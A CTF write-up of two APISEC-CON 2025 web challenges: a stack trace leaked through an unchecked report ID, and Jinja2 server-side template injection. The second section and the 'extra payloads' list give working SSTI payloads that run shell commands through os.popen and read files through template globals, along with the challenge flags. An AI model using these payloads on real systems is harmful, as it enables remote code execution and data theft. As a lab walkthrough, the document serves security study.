---
title: "APISEC-CON CTF – Exception Excavation & Render Bender"
date: 2025-05-18
category: Web/API (IDOR & SSTI)
platform: APISEC-CON CTF 2025
author: Vaishnav Baraskar
tags: ["CTF", "APISEC-CON", "IDOR", "SSTI", "Web Exploitation", "Broken Access Control", "Template Injection", "API Security", "2025"]
---

## 0x00 – The Setup

API challenges always make me pause. They're subtle, often logic-based, and prone to mishandling by developers chasing "RESTful perfection." When I saw two challenges dropped back-to-back—**Exception Excavation** and **Render Bender**—I knew there was potential for mischief.

---

## 0x01 – Exception Excavation (50 pts)

### Overview

A pretty classic start. There’s a bug report system, and it fetches reports by ID. Sounds normal—until you realize it doesn’t validate access control.

So when I threw this into the request:

```
GET /report/-1
```

I didn’t get an error. Instead, I got... a stack trace. Yeah. Full exception debug trace with context.

### My Thought Process

Seeing a negative index work was enough. At that point, my hacker sense was tingling. Stack traces often leak things like:
- filesystem paths
- ENV variables
- internal logs
- flags

So I started grepping.

### Flag Discovery

Tucked inside one of the traces (on the second page of output):

```
Exception: ValueError: Invalid token
flag{st4ck_tr4c3s_r3v34l_s3cr3ts}
```

Minimal effort. Maximum reward.

---

## 0x02 – Render Bender (150 pts)

### Overview

Now this one... was spicy.

You had an endpoint that echoed user input in the response. Suspicious. It rendered something like this:

```html
Hello {{ name }}
```

Which immediately led me to test for Server-Side Template Injection (SSTI).

I tried this payload:

```python
{{7*7}}
```

And the response came back with:

```
Hello 49
```

### Confirmed SSTI

At that point, I was locked in. Time to test full Jinja2 access.

```python
{{ self.__init__.__globals__.os.popen('ls /flags').read() }}
```

Output:

```
flag1.txt
flag2.txt
```

### Flag Extraction

One-by-one, I pulled them out:

```python
{{ self.__init__.__globals__.open('/flags/flag1.txt').read() }}
```

Result:

```
flag{t3mpl4t3_1nj3ct10n_fwt}
```

Then:

```python
{{ self.__init__.__globals__.open('/flags/flag2.txt').read() }}
```

Result:

```
flag{ch41n1ng_vuln3r4b1l1t13s_f0r_th3_w1n}
```

Clean RCE, clean flags.

---

## 0x03 – Extra Payload Examples

Here’s a shortlist of other working payloads:

```jinja
{{ self.__init__.__globals__['os'].popen('id').read() }}
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

---

## 0x04 – Final Thoughts

The first challenge was basic—but a reminder that debugging info has no place in prod. The second one showed how deep the rabbit hole goes when you mix logic bugs with powerful engines like Jinja2.

In both cases, I didn’t need fancy tooling. Just curiosity, minimal recon, and classic payloads.

---

## 0x05 – Tools Used

- Burp Suite
- Python + requests
- Custom SSTI fuzz list
- JQ + grep (for stack trace filtering)

---

## 0x06 – Flags

- `flag{st4ck_tr4c3s_r3v34l_s3cr3ts}`
- `flag{t3mpl4t3_1nj3ct10n_fwt}`
- `flag{ch41n1ng_vuln3r4b1l1t13s_f0r_th3_w1n}`

---
